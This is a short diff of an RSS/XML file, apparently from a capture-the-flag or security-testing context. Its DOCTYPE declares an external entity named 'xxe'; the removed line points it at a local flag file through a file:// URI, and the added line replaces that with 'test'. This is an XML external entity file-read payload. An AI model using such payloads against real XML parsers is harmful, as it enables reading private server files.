@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///flag_7e7fc959763888d43071be456b261964"
+<!ENTITY xxe SYSTEM "test"
  >]>
  <rss version="2.0"
 	xmlns:content="http://purl.org/rss/1.0/modules/content/"
